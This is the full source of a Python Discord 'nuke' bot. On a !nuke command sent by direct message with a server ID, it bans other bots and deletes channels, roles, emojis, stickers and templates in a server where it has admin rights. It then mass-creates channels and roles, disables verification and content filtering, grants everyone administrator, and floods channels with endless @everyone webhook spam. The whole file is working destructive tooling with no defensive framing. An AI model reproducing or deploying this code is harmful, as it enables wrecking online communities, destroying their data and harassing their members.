import os
import json
import random
import discord
from discord.ext import commands
from dotenv import load_dotenv
import asyncio

load_dotenv()
token = os.getenv('TOKEN')

with open('config.json', 'r', encoding='utf-8') as f:
    config = json.load(f)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print("Bot ready.")

async def perform_nuke(guild):
    for member in [m for m in guild.members if m.bot and m != guild.me]:
        try:
            await member.ban()
        except Exception:
            pass

    for template in await guild.templates():
        try:
            await template.delete()
        except Exception:
            pass

    for sticker in guild.stickers:
        try:
            await sticker.delete()
        except Exception:
            pass

    for emoji in guild.emojis:
        try:
            await emoji.delete()
        except Exception:
            pass

    for role in guild.roles:
        if role != guild.default_role and role != guild.me.top_role:
            try:
                await role.delete()
            except Exception:
                pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass

    colors = [discord.Color.red(), discord.Color.orange(), discord.Color.yellow(),discord.Color.green(), discord.Color.blue(), discord.Color.purple()]
    async def create_channel_and_role():
        try:
            await guild.create_text_channel(config["channel_name"])
            await guild.create_role(name=config["role_name"], color=random.choice(colors))
        except Exception:
            pass

    await asyncio.gather(*(create_channel_and_role() for _ in range(50)))

@bot.command()
async def nuke(ctx, server_id: int = None):
    if ctx.guild:
        return

    if server_id is None:
        await ctx.reply("**Wrong Usage!**\nCorrect Usage: `!nuke <server_id>`")
        return

    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.reply(f"Server ID Not Found: `{server_id}`\nPlease Invite Bot To Server Before Using This Command.")
        return

    if not guild.me.guild_permissions.administrator:
        await ctx.reply("Bot Has No Admin Permissions.")
        return

    await ctx.reply("Starting to nuke the server.")
    await perform_nuke(guild)

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == config["channel_name"]:
        async def spam_webhook():
            try:
                webhook = await channel.create_webhook(name=config["webhook_name"])
                while True:
                    await webhook.send(f"@everyone @here\n{config['message']}", tts=True)
            except discord.errors.Forbidden:
                pass
            except Exception:
                pass

        try:
            await channel.guild.edit(
                name=config["server_name"],
                icon=None,
                system_channel=None,
                verification_level=discord.VerificationLevel.none,
                default_notifications=discord.NotificationLevel.all_messages,
                explicit_content_filter=discord.ContentFilter.disabled
            )
            await channel.guild.default_role.edit(permissions=discord.Permissions(administrator=True))
            asyncio.create_task(spam_webhook())
        except discord.errors.Forbidden:
            pass
        except Exception:
            pass

bot.run(token)
